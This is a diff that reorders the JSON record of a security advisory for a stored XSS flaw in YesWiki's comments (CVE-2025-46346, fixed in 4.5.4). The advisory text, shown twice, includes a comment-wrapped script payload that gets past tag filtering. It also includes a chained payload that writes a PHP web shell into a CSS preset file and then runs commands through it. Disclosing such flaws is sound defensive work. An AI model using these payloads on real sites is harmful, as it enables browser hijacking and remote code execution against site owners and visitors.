@@ -1,52 +1,17 @@
 {
-  "id": "GHSA-59x8-cvxh-3mm4",
-  "summary": "YesWiki Stored XSS Vulnerability in Comments ",
-  "details": "### Summary\n\nA stored cross-site scripting (XSS) vulnerability was discovered in the application\u2019s comments feature. This issue allows a malicious actor to inject JavaScript payloads that are stored and later executed in the browser of any user viewing the affected comment.\n\nThe XSS occurs because the application fails to properly sanitize or encode user input submitted to the comments. Notably, the application sanitizes or does not allow execution of `<script>` tags, but does not account for payloads obfuscated using JavaScript block comments like `/* JavaScriptPayload */`. \n\n### PoC\nNavigate to a site and page that allows comments and place this in the comments section and submit it: \n\n`/*<script>alert('pizzapower')</script>*/`\n\nUpon submitting to the page, it will run. And then upon every page visit, it will run. \n\n### Impact\n\nAn attacker can run arbitrary JS in the victim's browser (any user that visits the page with the comments). This can be chained to do many malicious actions, such as to achieve RCE when chained with another vulnerability, e.g.: \n\n```\n/*<script>fetch(\"/?api/templates/custom-presets/anhtyjik.php\",{method:\"POST\",headers:{\"Content-Type\":\"application/x-www-form-urlencoded\"},body:\"primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif\"});</script>*/\n```\n\nThen you can visit `http://localhost:8085/custom/css-presets/anhtyjik.php?cmd=id` and see the output of the ID command.",
-  "aliases": [
-    "CVE-2025-46346"
-  ],
-  "modified": "2025-04-29T20:43:05.270881Z",
-  "published": "2025-04-29T14:49:12Z",
-  "related": [
-    "CVE-2025-46346"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2025-04-29T16:15:36Z",
-    "cwe_ids": [
-      "CWE-79"
-    ],
-    "severity": "LOW",
-    "github_reviewed": true,
-    "github_reviewed_at": "2025-04-29T14:49:12Z"
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-59x8-cvxh-3mm4"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-46346"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/YesWiki/yeswiki"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "last_known_affected_version_range": "<= 4.5.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-59x8-cvxh-3mm4/GHSA-59x8-cvxh-3mm4.json"
+      },
       "package": {
-        "name": "yeswiki/yeswiki",
         "ecosystem": "Packagist",
+        "name": "yeswiki/yeswiki",
         "purl": "pkg:composer/yeswiki/yeswiki"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -54,7 +19,8 @@
             {
               "fixed": "4.5.4"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -81,18 +47,52 @@
         "v4.5.1",
         "v4.5.2",
         "v4.5.3"
-      ],
-      "database_specific": {
-        "last_known_affected_version_range": "<= 4.5.3",
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-59x8-cvxh-3mm4/GHSA-59x8-cvxh-3mm4.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "CVE-2025-46346"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-04-29T14:49:12Z",
+    "nvd_published_at": "2025-04-29T16:15:36Z",
+    "severity": "LOW"
+  },
+  "details": "### Summary\n\nA stored cross-site scripting (XSS) vulnerability was discovered in the application\u2019s comments feature. This issue allows a malicious actor to inject JavaScript payloads that are stored and later executed in the browser of any user viewing the affected comment.\n\nThe XSS occurs because the application fails to properly sanitize or encode user input submitted to the comments. Notably, the application sanitizes or does not allow execution of `<script>` tags, but does not account for payloads obfuscated using JavaScript block comments like `/* JavaScriptPayload */`. \n\n### PoC\nNavigate to a site and page that allows comments and place this in the comments section and submit it: \n\n`/*<script>alert('pizzapower')</script>*/`\n\nUpon submitting to the page, it will run. And then upon every page visit, it will run. \n\n### Impact\n\nAn attacker can run arbitrary JS in the victim's browser (any user that visits the page with the comments). This can be chained to do many malicious actions, such as to achieve RCE when chained with another vulnerability, e.g.: \n\n```\n/*<script>fetch(\"/?api/templates/custom-presets/anhtyjik.php\",{method:\"POST\",headers:{\"Content-Type\":\"application/x-www-form-urlencoded\"},body:\"primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif\"});</script>*/\n```\n\nThen you can visit `http://localhost:8085/custom/css-presets/anhtyjik.php?cmd=id` and see the output of the ID command.",
+  "id": "GHSA-59x8-cvxh-3mm4",
+  "modified": "2025-04-29T20:43:05.270881Z",
+  "published": "2025-04-29T14:49:12Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-59x8-cvxh-3mm4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-46346"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/YesWiki/yeswiki"
+    }
+  ],
+  "related": [
+    "CVE-2025-46346"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N/E:P"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N/E:P",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "YesWiki Stored XSS Vulnerability in Comments "
 }
